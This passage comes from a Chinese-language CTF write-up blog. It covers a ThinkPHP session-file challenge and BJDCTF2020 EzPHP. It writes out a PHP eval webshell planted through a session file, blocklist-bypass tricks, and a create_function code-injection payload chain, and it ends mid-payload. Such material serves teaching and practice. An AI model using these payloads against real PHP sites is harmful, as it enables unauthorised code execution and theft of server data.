class="hljs-variable">$recordLen</span> &gt;= <span class="hljs-number">3</span>)&#123;<br>                    <span class="hljs-title function_ invoke__">array_shift</span>(<span class="hljs-variable">$recordArr</span>);<br>                    <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$recordArr</span>) . <span class="hljs-string">&quot;,&quot;</span> . <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-title class_">View</span>::<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&quot;result&quot;</span>,[<span class="hljs-string">&quot;res&quot;</span> =&gt; <span class="hljs-string">&quot;There&#x27;s nothing here&quot;</span>]);<br>                &#125;<br><br>            &#125;<br>            <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-variable">$record</span> . <span class="hljs-string">&quot;,&quot;</span> . <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">View</span>::<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&quot;result&quot;</span>,[<span class="hljs-string">&quot;res&quot;</span> =&gt; <span class="hljs-string">&quot;There&#x27;s nothing here&quot;</span>]);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">View</span>(<span class="hljs-string">&quot;search&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要就是下面这几点：</p><p>session文件，一般位于项目根目录下的<code>./runtime/session/</code>文件夹下，也就是<code>/runtime/session/sess_叉叉叉.php</code>(注意这里名+.php要满足32个字符)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;post.&quot;</span>);<br><span class="hljs-variable">$record</span> = <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>))<br>&#123;<br>    <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>post</code>传<code>$data</code>，然后把它保存到session中键<code>record</code>对应的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title class_">Request</span>::<span class="hljs-title function_ invoke__">isPost</span>())&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&#x27;?UID&#x27;</span>))<br>            &#123;      <br></code></pre></td></tr></table></figure><p>给key传个一句话：<code>&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;</code>，然后访问目标文件(按理说会有两个键值对：uid和key)：</p><p><code>/runtime/session/sess_1234567890123456789012345678.php</code></p><p><img src="/img/easyyyyyyyythingking5.png" alt="easyyyyyyyythingking5"></p><p>没问题，先看环境变量里是否有flag：有，不过是假的：</p><p><img src="/img/easythinking6.png" alt="easythinking6"></p><p>蚁剑连接：</p><p><img src="/img/easythingking7.png" alt="easythingking7"></p><p><code>flag</code>没法读(估计是禁用了大量函数，phpinfo的disable_functions里可以看到。想到之前极客大挑战里做过类似的，蚁剑提供了绕过功能：</p><p><img src="/img/easythinking9.png" alt="easythinking9"></p><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p><img src="/img/bjdctfezphp1.png" alt="bjdctfezphp1"></p><p>看源码，注意红框：</p><p><img src="/img/bjdctfezphp2.png" alt="bjdctfezphp2"></p><p>大写字母加数字组合，等号结尾，看着像<code>base</code>家族的但不是<code>base64</code>?<code>base32</code>解码得到：<code>1nD3x.php</code>，访问：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;1nD3x.php&quot;</span>;<br><span class="hljs-variable">$shana</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shana&#x27;</span>];<br><span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br><span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>) &#123; <br>    <span class="hljs-keyword">if</span> (<br>        <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])<br>        )  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You seem to want to do something bad?&#x27;</span>); <br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123; <br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>) &#123; <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))  <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>); <br>    &#125; <br>&#125; <br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>) !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$shana</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$passwd</span>) &amp;&amp; <span class="hljs-variable">$shana</span> != <span class="hljs-variable">$passwd</span> )&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>) || <br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="hljs-variable">$arg</span>) ) &#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-variable">$code</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>); <br>&#125; <span class="hljs-meta">?&gt;</span><br>This is a very simple challenge <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span> you solve it I will give you a flag. Good Luck!<br>Aqua is the cutest five-year-old child in the world! Isn<span class="hljs-string">&#x27;t it ?</span><br></code></pre></td></tr></table></figure><p>第一部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>) &#123; <br>    <span class="hljs-keyword">if</span> (<br>        <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])<br>        )  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You seem to want to do something bad?&#x27;</span>); <br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123; <br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);<br></code></pre></td></tr></table></figure><p>首先是<code>$_SERVER</code>这个超全局变量：</p><p><img src="/img/bjdctfezphp3.png" alt="bjdctfezphp3"></p><p>有服务器信息能访问时它就为真，接下来是<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>这东西：存储当前请求的查询字符串部分。查询字符串是 URL 中问号后面的部分，通常用于向服务器传递参数。不过注意这东西不会<code>URLDecode</code></p><p>比如对于这个<code>URL</code>:</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xquery">https://example.com/page.php<span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span><span class="hljs-meta">%20name</span>=John<br><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>] 为<span class="hljs-built_in"> id</span>=<span class="hljs-number">123</span><span class="hljs-meta">%20name</span>=John<br><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] 为 John Doe<br></code></pre></td></tr></table></figure><p>第一个正则<code>ban</code>了<code>debu,aqua,cute</code>啥的，但接下来的正则匹配很明显要给<code>debu</code>赋值。所以这里把过滤的字符<code>URL</code>编码一下就行。</p><p>第二个正则：<code>preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;)</code></p><p>这里令<code>?debu=aqua_is_cute%0a</code>就行，因为非多行模式下<code>$</code>这个东西似乎会忽略在句尾的<code>%0a</code></p><p>第二部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>) &#123; <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))  <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>); <br>    &#125; <br>&#125; <br></code></pre></td></tr></table></figure><p><code>$_REQUEST</code> 超全局变量包含了 <code>$_GET</code>、<code>$_POST</code> 和 <code>$_COOKIE</code> 超全局变量的合集。这里会遍历每个字符然后过正则匹配(过滤了所有大小写字母)。</p><p>假如我们<code>get</code>传一个<code>a</code>,<code>post</code>也传一个<code>a</code>，那么<code>$_REQUEST[a]</code> 会是谁的值呢？</p><p>这取决于你的php.ini中的<code>variables_order</code>的设置，默认为：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">variables_order</span> = <span class="hljs-string">&quot;GPCS&quot;</span><br></code></pre></td></tr></table></figure><p>它们的顺序决定了 PHP 在处理超全局变量时的优先级。例如，如果 <code>variables_order = &quot;GPCS&quot;</code>，那么 PHP 会先将 <code>$_GET</code> 的值转换为全局变量，然后是 <code>$_POST</code>，接着是 <code>$_COOKIE</code>，最后是 <code>$_SESSION</code>。</p><p>也就是说，他先取了get的值然后判断有没有post的值有的话就覆盖掉。那么我们只需要将要get传入的参数post传一遍非字母的就行。</p><p>第三部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>) !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$shana</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$passwd</span>) &amp;&amp; <span class="hljs-variable">$shana</span> != <span class="hljs-variable">$passwd</span> )&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这部分很简单，<code>file_get_contents</code>的判断我们直接利用<code>data</code>伪协议写<code>debu_debu_aqua</code>到<code>file</code>里就好。</p><p><code>data://text/plain,debu_debu_aqua</code></p><p>接下来是两个哈希强等于，直接数组绕过就行：</p><p><code>$shana[]=1&amp;$passwd[]=2</code></p><p><code>extract($_GET[&quot;flag&quot;]);</code>：进行变量覆盖。</p><p>第四部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>) || <br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="hljs-variable">$arg</span>) ) &#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-variable">$code</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>); <br>&#125; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这部分不会做。。查了<code>wp</code>发现这东西叫<code>create_function</code>代码注入，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//createwhat.php,注意这玩意儿在7.2及7.3以上都没法用了</span><br><span class="hljs-comment">//这东西最大的特点就是在内部对第二个参数执行eval</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a, $b&#x27;</span>, <span class="hljs-string">&#x27;return($a+$b);&#x27;</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$func</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>));<br></code></pre></td></tr></table></figure><p><img src="/img/bjdctfezphp4.png" alt="bjdctfezphp4"></p><p>回显了<code>3</code>，实际上<code>func</code>这东西就相当于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> (<span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>);<br> &#125;<br></code></pre></td></tr></table></figure><p>这时我们令<code>$b =1);&#125;phpinfo();/*</code>，执行的会是什么呢？：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-keyword">return</span> (<span class="hljs-variable">$a</span>+<span class="hljs-number">1</span>);&#125;<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">/*;</span><br><span class="hljs-comment"> &#125;</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><p>比如对于这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$str2</span>=<span class="hljs-string">&#x27;echo  $a&#x27;</span>.<span class="hljs-string">&#x27;test&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$str2</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;==============================&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$f1</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a&#x27;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/bjdctfezphp5.png" alt="bjdctfezphp5"></p><p><code>payload</code>：<code>?id=;&#125;phpinfo();/*</code></p><p><img src="/img/bjdctfezphp6.png" alt="bjdctfezphp6"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">原函数：<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fT</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;test&quot;</span>.<span class="hljs-variable">$id</span>;<br>&#125;<br><br>代码注入后:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fT</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;test&quot;</span>;&#125;<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">/*;</span><br><span class="hljs-comment">&#125;</span><br></code></pre></td></tr></table></figure><p>所以对于<code>$code(&#39;&#39;, $arg); </code>这东西，我们可以利用<code>create_function</code>来执行命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>)<br></code></pre></td></tr></table></figure><p>这东西意思是只匹配大小写字母和数字，要是存在其它的就返回<code>false</code>。<code>create_function</code>正好存在<code>_</code>。令<code>flag[code]=create_function</code>：<code>create_function(&#39;&#39;,$arg)</code>，这东西就相当于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lambda</span>(<span class="hljs-params"><span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br><span class="hljs-variable">$arg</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以通过利用<code>$arg</code>闭合<code>&#123;</code>然后进行命令执行，比如<code>arg=&#125;func();//</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> &#125;<span class="hljs-title function_ invoke__">func</span>();<span class="hljs-comment">//</span><br>&#125;<br></code></pre></td></tr></table></figure><p>由于存在<code>include&quot;flag.php&quot;</code>，可以利用<code>var_dump</code>和<code>get_defined_vars()</code>将所有变量和值输出(假设<code>flag.php</code>中定义了<code>$flag=xxxx</code>之类的)</p><p>梳理下截至到目前的<code>payload:</code></p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">file</span>=data://text/plain,debu_debu_aqua<span class="hljs-variable">&amp;debu</span>=aqua_is_cute <span class="hljs-variable">&amp;shana</span>[]=1<span class="hljs-variable">&amp;passwd</span>[]=2<span class="hljs-variable">&amp;flag</span>[code]=create_function<span class="hljs-variable">&amp;flag</span>[arg]=&#125;var_dump(get_defined_vars());//<br><br>POST传<span class="hljs-keyword">file</span>=1<span class="hljs-variable">&amp;debu</span>=2<br><br></code></pre></td></tr></table></figure><p>注意<code>$_SERVER[&#39;QUERY_STRING&#39;])</code>，把这东西<code>URL</code>编码一下(file和&#x3D;不用编码，没过滤)：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">//一般不会对字母进行URL编码，如果编码的话就是对应十六进制表示然后前面的<span class="hljs-number">0</span><span class="hljs-keyword">x</span>换成百分号<br><span class="hljs-number">1</span>nD<span class="hljs-number">3</span><span class="hljs-keyword">x</span>.php?file<span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span 